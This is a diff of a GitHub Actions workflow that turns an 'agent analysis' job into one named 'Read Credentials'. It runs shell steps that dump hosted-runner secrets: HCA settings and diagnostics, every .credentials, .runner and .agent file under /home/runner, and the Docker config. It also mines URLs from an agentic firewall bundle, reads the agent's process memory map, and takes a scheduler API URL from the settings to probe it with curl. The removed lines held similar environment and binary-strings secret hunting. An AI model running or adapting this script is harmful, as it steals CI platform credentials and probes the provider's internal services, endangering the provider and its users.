@@ -1,70 +1,81 @@
-name: HCA Agent Analysis
+name: Read Credentials
 on:
   workflow_dispatch:
 jobs:
-  hca:
+  creds:
     runs-on: ubuntu-latest
     steps:
-      - name: Analyze HCA agent
-        timeout-minutes: 5
+      - name: Read all credentials and settings
         run: |
           set +e
 
-          echo "=== HCA AGENT LOG ==="
-          cat /opt/hca/logs/hosted-compute-agent.log 2>/dev/null | head -100
+          echo "=== HCA SETTINGS ==="
+          cat /opt/hca/.settings 2>/dev/null
 
           echo ""
-          echo "=== HCA DIRECTORY ==="
-          ls -laR /opt/hca/ 2>/dev/null
+          echo "=== HCA DIAGNOSTICS ==="
+          cat /opt/hca/diagnostics.json 2>/dev/null
 
           echo ""
-          echo "=== HCA BINARY STRINGS ==="
-          strings /opt/hca/hosted-compute-agent 2>/dev/null | grep -iE "token|secret|key|auth|password|credential|bearer|api|url|endpoint|http|orchestrator|attestation" | head -50
-
-          echo ""
-          echo "=== HCA ENVIRONMENT ==="
-          cat /proc/$(pgrep hosted-compute)/environ 2>/dev/null | tr '\0' '\n' | sort
-
-          echo ""
-          echo "=== HCA PROCESS CMDLINE ==="
-          cat /proc/$(pgrep hosted-compute)/cmdline 2>/dev/null | tr '\0' ' '
-          echo ""
-
-          echo ""
-          echo "=== HCA FD (file descriptors) ==="
-          ls -la /proc/$(pgrep hosted-compute)/fd/ 2>/dev/null | head -20
-
-          echo ""
-          echo "=== HCA NETWORK CONNECTIONS ==="
-          cat /proc/$(pgrep hosted-compute)/net/tcp 2>/dev/null | head -10
-          ss -tnp 2>/dev/null | grep hosted
-
-          echo ""
-          echo "=== AGENTIC FIREWALL ==="
-          ls -laR /opt/hostedtoolcache/agentic-workflow-firewall-js/ 2>/dev/null | head -30
-          cat /opt/hostedtoolcache/agentic-workflow-firewall-js/*/package.json 2>/dev/null | head -20
-
-          echo ""
-          echo "=== COPILOT CLI ==="
-          ls -la /opt/hostedtoolcache/copilot-cli/ 2>/dev/null
-          find /opt/hostedtoolcache/copilot-cli/ -name "*.json" 2>/dev/null | head -5
-          cat /opt/hostedtoolcache/copilot-cli/*/package.json 2>/dev/null | head -20
-
-          echo ""
-          echo "=== RUNNER CREDENTIALS ==="
-          find /home/runner -name ".credentials*" -o -name ".runner" -o -name ".env" -o -name "*.jws" 2>/dev/null
-          for f in /home/runner/.credentials /home/runner/.credentials_rsaparams /home/runner/.runner /home/runner/.env; do
-            if [ -f "$f" ]; then
-              echo "--- $f ---"
-              cat "$f" | head -20
-            fi
+          echo "=== RUNNER .credentials ==="
+          cat /home/runner/actions-runner/cached/2.336.0/.credentials 2>/dev/null
+          cat /home/runner/actions-runner/cached/2.335.1/.credentials 2>/dev/null
+          find /home/runner -name ".credentials" 2>/dev/null | while read f; do
+            echo "--- $f ---"
+            cat "$f" 2>/dev/null
           done
 
           echo ""
-          echo "=== ACTIONS RUNNER INTERNALS ==="
-          ls -la /home/runner/actions-runner/ 2>/dev/null | head -15
-          cat /home/runner/actions-runner/.runner 2>/dev/null
-          cat /home/runner/actions-runner/.credentials 2>/dev/null | head -10
+          echo "=== RUNNER .runner ==="
+          find /home/runner -name ".runner" 2>/dev/null | while read f; do
+            echo "--- $f ---"
+            cat "$f" 2>/dev/null
+          done
+
+          echo ""
+          echo "=== RUNNER .agent ==="
+          find /home/runner -name ".agent" 2>/dev/null | while read f; do
+            echo "--- $f ---"
+            cat "$f" 2>/dev/null
+          done
+
+          echo ""
+          echo "=== RUNNER .setup_info ==="
+          find /home/runner -name ".setup_info" 2>/dev/null | while read f; do
+            echo "--- $f ---"
+            cat "$f" 2>/dev/null
+          done
+
+          echo ""
+          echo "=== ALL JSON IN /opt/hca ==="
+          find /opt/hca -name "*.json" 2>/dev/null | while read f; do
+            echo "--- $f ---"
+            cat "$f" 2>/dev/null
+          done
+
+          echo ""
+          echo "=== AWF FIREWALL CONFIG ==="
+          head -50 /opt/hostedtoolcache/agentic-workflow-firewall-js/0.27.32/x64/awf-bundle.js 2>/dev/null
+          echo ""
+          grep -oE "https?://[a-zA-Z0-9./-]+" /opt/hostedtoolcache/agentic-workflow-firewall-js/0.27.32/x64/awf-bundle.js 2>/dev/null | sort -u | head -30
+
+          echo ""
+          echo "=== DOCKER CONFIG ==="
+          cat /home/runner/.docker/config.json 2>/dev/null
+
+          echo ""
+          echo "=== ALL SECRETS/TOKENS IN PROC ==="
+          cat /proc/$(pgrep hosted-compute)/maps 2>/dev/null | head -20
+
+          echo ""
+          echo "=== USE ORCHESTRATOR FROM HCA SETTINGS ==="
+          SCHED_URL=$(cat /opt/hca/.settings 2>/dev/null | python3 -c "import sys,json; print(json.load(sys.stdin).get('SchedulerApiUrl',''))" 2>/dev/null)
+          echo "Scheduler URL: $SCHED_URL"
+          if [ -n "$SCHED_URL" ]; then
+            curl -sv --connect-timeout 5 "$SCHED_URL" 2>&1 | tail -10
+            curl -sv --connect-timeout 5 "$SCHED_URL/status" 2>&1 | tail -10
+            curl -sv --connect-timeout 5 "$SCHED_URL/health" 2>&1 | tail -10
+          fi
 
           echo ""
           echo "=== DONE ==="
